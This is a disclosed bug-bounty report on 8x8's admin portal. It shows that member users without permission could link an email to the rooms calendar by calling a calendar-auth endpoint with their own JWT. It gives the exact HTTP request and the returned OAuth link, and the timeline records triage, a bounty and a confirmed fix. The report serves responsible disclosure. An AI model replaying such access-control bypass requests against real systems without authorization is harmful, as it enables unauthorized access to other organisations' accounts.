---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
  - vuln/broken-access-control
  - vuln/cors-misconfig
  - vuln/jwt
  - trigger/cors-origin
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2023-02-15
submitted: 2022-02-20T06:51:49.026Z
bounty_usd: null
votes: 48
cve: []
program: "[[programs/8x8-bounty|8x8]]"
reporter: "emperor"
source: "https://hackerone.com/reports/1486310"
title: "admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?.."
---
# admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 48 | **Program:** 8x8 | **Disclosed:** 2023-02-15

- Report: [https://hackerone.com/reports/1486310](https://hackerone.com/reports/1486310)
- CWE: Improper Access Control - Generic
- Submitted: 2022-02-20T06:51:49.026Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Dear Team,

Greetings!!!

I have observed an Improper access control Issue. Member users do not have permission to rooms area of the admin section. But member users can exploit this via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2

Steps to reproduce
**Step1**: Member users do not have access to the room's area.
Use {F1625870}

**Step2**: Admin users can add their email to sync calendars from this area.
Use {F1625869}

**Step3**: From member user's JWT send a request to below endpoint
Use ██████

```
GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2
Host: admin.8x8.vc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://admin.8x8.vc/
Content-Type: application/json
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Authorization: <Member user's JWT>
```

**Step4**: You will receive the Link as below from the above endpoint: 
```
{"url":"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=███████&avoid_linking=true"}
```

**Step5**: Now use this link and complete the OAuth sign up. (There is no validation and the application will allow you to add your email)
Use {F1625872}

**Step6**: Member user successfully added his/her email into admin's room area
Use ███

Best regards,
Emperor

## Impact

- Member users with no permission can integrate email to connect calendar

## Timeline

- **Report Filed**
- **2022-02-20** @42x42: Hey @emperor,
Thanks for your submission. Your report is currently being reviewed and the triage team will get back to you once there is additional information to share.

I'm gonna have a look at all the reports combined on Monday. Thank you for your understanding.
- **2022-02-20** @emperor: @42x42 No worries at all. Thanks for the update!!

Best,
Emperor
- **2022-02-21** @42x42: Pretty neat finding!
- **Report Triaged**
- **2022-02-21** @emperor: @42x42 Thank you so much!!

Best,
- **Bounty Awarded**
- **2022-02-25** @emperor: Thank you very much for the reward! <3

Cheers,
Emperor
- **2022-02-28** @42x42: Hey @emperor,
This one should also be resolved now. Could you kindly confirm?
- **2022-02-28** @emperor: Heya! @42x42 I can confirm this is fixed. 

Short summary:
Sending the request to GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2 using above bug will now throw "HTTP/2 403 Forbidden" error for the same

Use ███

Thank you for the quick fix.

Cheers,
Emperor
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
